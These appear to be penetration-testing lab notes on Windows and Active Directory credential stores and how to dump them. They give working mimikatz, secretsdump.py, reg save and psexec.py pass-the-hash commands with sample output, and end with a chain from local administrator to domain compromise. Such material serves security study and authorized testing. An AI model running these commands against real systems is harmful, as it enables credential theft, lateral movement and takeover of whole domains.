Windows and Active Directory store credentials in different locations depending on how they are used.

## 1. LSASS Memory
**LSASS** (`lsass.exe` --> Local Security Authority Subsystem Service) handles Windows authentication and keeps credential material in memory.

### May contain
- NTLM hashes
- Kerberos TGTs and service tickets
- Plaintext credentials in some configurations

### Why it exists
Allows authentication and **Single Sign-On (SSO)** between services.

### Access
Requires high privileges, typically **SYSTEM/Administrator**, to dump LSASS memory.

### Tools
```text
mimikatz
```

```text
sekurlsa::logonpasswords
```

> **Important:** LSASS contains live credentials, so its contents change as users log in and out.

---

# 2. SAM + SYSTEM Hives
The Windows SAM (Security Account Manager) file is a critical database that stores local user account passwords in a hashed format.

### Locations
```text
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
```

The `SAM` hashes are protected using keys derived from the **SYSTEM hive (BootKey)**.

### Why it exists
Provides authentication for local Windows accounts.

### Access
Usually requires **SYSTEM-level access** or offline/backup access to the hives.

### Tools
```text
mimikatz
```

```text
lsadump::sam
```

Can extract local account password hashes when the required hives/keys are accessible.

---

# 3. LSA Secrets
Local Security Authority secrets are protected sensitive data stored in the Windows registry that include service account passwords, auto-logon credentials, and domain cache information.

LSA Secrets are stored under:
```text
HKLM\SECURITY\Policy\Secrets
```

### May contain
- Service account credentials
- Scheduled task credentials
- Cached domain authentication material
- Other application/system secrets

### Access
Normally requires **SYSTEM** privileges.

### Tool
```text
secretsdump.py
```

Can extract LSA Secrets when appropriate administrative credentials/access are available.

---

# 4. DPAPI

**DPAPI (Data Protection API)** protects secrets belonging to Windows users.
Commonly protects:
- Browser credentials
- Wi-Fi credentials
- RDP credentials
- Application secrets

### Master Keys

User DPAPI master keys are stored under:
```text
%APPDATA%\Microsoft\Protect
```

Access to the user's DPAPI material plus the required decryption key/password can allow protected secrets to be recovered.

### Tool
```text
mimikatz
```

Example:
```text
vault::list
```

Lists Windows Vault credentials.
```text
vault::cred
```

Attempts to retrieve stored Vault credentials.

---

# 5. NTDS.dit
`NTDS.dit` is the **Active Directory database** stored on Domain Controllers.

### Contains
- Domain users
- Computer accounts
- NTLM password hashes
- Kerberos key material
- Other AD objects

### Location
```text
C:\Windows\NTDS\ntds.dit
```

### Why it exists
It is the database used by the Domain Controller for **Active Directory authentication and directory services**.

### Access
Can be obtained through methods such as:
- Offline database extraction
- AD replication abuse (**DCSync**)

### Tools
```text
secretsdump.py
```

Extracts domain credential material from a DC.
```text
mimikatz
```

```text
lsadump::dcsync
```

Requests credential information through AD replication.

---

# 6. Credential Store Quick Reference

|Store|Main Contents|Typical Access|
|---|---|---|
|**LSASS**|NTLM hashes, Kerberos tickets, sometimes plaintext creds|Dump `lsass.exe` memory|
|**SAM**|Local account hashes|SAM + SYSTEM hives|
|**LSA Secrets**|Service/task secrets and other protected secrets|SYSTEM/LSA access|
|**DPAPI**|User/application stored credentials|User context + DPAPI keys|
|**NTDS.dit**|Domain account hashes & Kerberos keys|DC/replication access|

## Pentesting Priority
```text
Local Machine
├── LSASS
├── SAM + SYSTEM
├── LSA Secrets
└── DPAPI

Domain Controller
└── NTDS.dit
```

**Key distinction:**
- **SAM** → local accounts
- **LSASS** → credentials currently loaded in memory
- **LSA Secrets** → system/service/application secrets
- **DPAPI** → user/application protected secrets
- **NTDS.dit** → domain-wide AD credential database

---

# Credential Dumping — Secretsdump & Mimikatz

Credential stores can reveal passwords, hashes, and Kerberos material that can be reused for **lateral movement, privilege escalation, and domain compromise**.


# 1. Secretsdump — Local Administrator

`secretsdump.py` can remotely extract credential material from a Windows machine using SMB/RPC.

```bash
secretsdump.py 'DOMAIN/Administrator:Password@TARGET_IP' -output local_dump
```

### What the output gives you

#### Local SAM hashes
```text
Administrator:500:LM_HASH:NTLM_HASH:::
LocalUser1:1000:LM_HASH:NTLM_HASH:::
```

**Useful for:**
- Identifying local administrator accounts
- Cracking local passwords offline
- Pass-the-Hash if the NTLM hash belongs to an account that accepts network authentication
- Checking whether the same local password may be reused on other machines

### Cached domain credentials

```text
DOMAIN/user:$DCC2$10240#user#HASH
```

These are **MSCache v2 / DCC2** hashes.

**Useful for:**
- Identifying domain accounts that previously logged onto the machine
- Finding potentially privileged users who have logged onto a workstation
- Offline password cracking

> DCC2 hashes **cannot be directly used for Pass-the-Hash**.

**MSCache v2** (also known as **DCC2**, short for **Domain Cached Credentials version 2**) is the password hashing format used by Windows operating systems to allow domain users to log into their computers when a **Domain Controller (DC) is unreachable**

### Why crack them?

A successful crack gives you the **plaintext domain password**.

This can potentially provide:
```text
Domain credentials
        ↓
SMB / WinRM / RDP / LDAP
        ↓
Access to other machines
        ↓
Further enumeration / privilege escalation
```

The most important finding is **who the credential belongs to**.

For example:
```text
User: drgonzo
Password: ********
```

If `drgonzo` is a privileged domain account, the impact is much greater than a normal user account.

---

# 3. Secretsdump — Domain Controller

If you obtain an account with sufficient replication privileges, target the Domain Controller:

```bash
secretsdump.py 'DOMAIN/user:Password@DC_IP' -just-dc -output dc_dump
```

`-just-dc` performs a **DCSync-style extraction** instead of dumping the local SAM.

### Output
```text
username:RID:LM_HASH:NT_HASH:::
```

Example:
```text
Administrator:500:LM_HASH:NTLM_HASH:::
krbtgt:502:LM_HASH:NTLM_HASH:::
user:1609:LM_HASH:NTLM_HASH:::
```

### What this tells you

You can obtain credential material for **many/all domain accounts**, including:

- Domain administrators
- Normal users
- Service accounts
- `krbtgt`
- Computer accounts

This is a major AD finding because the credentials can enable further domain-level attacks.

---

# 4. NTLM Hash → Pass-the-Hash

If you obtain a user's NTLM hash, you may be able to authenticate without knowing the plaintext password.

Example:
```bash
psexec.py 'DOMAIN/Administrator@DC_IP' -hashes :NTLM_HASH
```

### Pentesting value
```text
NTLM hash
   ↓
Pass-the-Hash
   ↓
Remote authentication
   ↓
Command execution
```

For example, successful execution as a Domain Administrator can result in:
```text
whoami
nt authority\system
```

This demonstrates that **the password itself was not required**.

---

# 5. Mimikatz — DPAPI

```text
mimikatz # vault::list
```

**What it does:** Lists Windows credential vaults.

You may discover:
- Windows Credentials
- Web Credentials
- Stored application credentials

### Extract credentials

```text
mimikatz # vault::cred /export
```

Example output:
```text
TargetName : WRK
UserName   : DOMAIN\svc-app

TargetName : gmail.com
UserName   : ElonTusk
Credential : ********
```

### How this helps in AD pentesting

The important information is:
```text
Username + Target + Password
```

A discovered domain credential such as:
```text
DOMAIN\svc-app : password
```

can be tested against authorized domain services.

It may provide:
- Access to other machines
- SMB/WinRM/RDP access
- Access to applications/services
- A path toward privilege escalation

---

# 6. SAM + SYSTEM — Mimikatz

First export the hives:
```cmd
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```

Then:
```text
mimikatz # lsadump::sam /sam:"C:\...\SAM" /system:"C:\...\SYSTEM"
```

### Output
```text
User : Administrator
Hash NTLM: 568a741b56c79622cc3f4c83720bf45e
```

### AD pentesting value

This gives you **local account NTLM hashes**.

You can then:
1. Attempt offline password cracking
2. Test for password reuse on other machines
3. Test Pass-the-Hash where appropriate
4. Identify valuable local administrator credentials

---

# 7. LSASS Memory

First enable debugging:

```text
mimikatz # privilege::debug
```

Then:
```text
mimikatz # sekurlsa::logonpasswords
```

### Output can contain
```text
Username : Administrator
Domain   : WRK
NTLM     : <hash>
Password : <plaintext>
```

It may also reveal credentials stored by **Credential Manager** or other authentication packages.

### AD pentesting value

LSASS tells you **who is currently or recently authenticated on the machine** and what credential material is available in memory.

For example:
```text
DOMAIN\Administrator
```

appearing in LSASS is highly significant because it means a privileged account has authenticated to that workstation.

You can then investigate the credential material available for that session.

> If a domain user logged onto the machine previously but has no active/relevant logon session anymore, their credentials may no longer be available in LSASS.

---

# 8. LSA Cached Credentials

Elevate to SYSTEM:
```text
mimikatz # privilege::debug
mimikatz # token::elevate
```

Check:
```text
mimikatz # lsadump::cache
```

### Output
```text
User : DOMAIN\Administrator
MsCacheV2 : <hash>

User : DOMAIN\user
MsCacheV2 : <hash>
```

### AD pentesting value

This reveals **domain accounts that have previously authenticated to the machine** and their cached credential material.

The hashes can be cracked offline:
```text
DCC2
 ↓
Password cracking
 ↓
Plaintext password
 ↓
Test authorized domain access
```

---

# 9. What to Look for in the Output

When dumping credentials, don't just collect hashes. **Identify the account and its role.**

### High-value findings

|Finding|Why it matters|
|---|---|
|Domain Admin credentials|Potential domain-wide administrative access|
|Privileged domain account cached on workstation|Possible path to privilege escalation|
|Service account password|May provide access to services/servers|
|Reused local Administrator hash|Possible lateral movement|
|NTLM hash|May allow Pass-the-Hash|
|Crackable DCC2 hash|Can recover plaintext domain password|
|`krbtgt` hash|Extremely sensitive domain credential material|
|Computer account hash|Useful for certain AD authentication/attack paths|
|Stored RDP credentials|Possible access to another system|
|Browser/application credentials|Credential reuse or access to other services|

---

# 10. Attack Chain

The main lesson from this task is the **credential escalation chain**:
```text
Local Administrator
       ↓
Credential Dumping
       ↓
SAM / LSASS / LSA Secrets / DCC2
       ↓
Recover domain credentials
       ↓
Authenticate as privileged user
       ↓
DCSync / NTDS credential extraction
       ↓
Domain account NTLM hashes
       ↓
Pass-the-Hash
       ↓
Remote access
```

The key question after every dump is:
> **"Whose credential did I obtain, and what privileges/access does that account have in the domain?"**

That determines whether the credential is useful for **lateral movement, privilege escalation, or domain compromise**.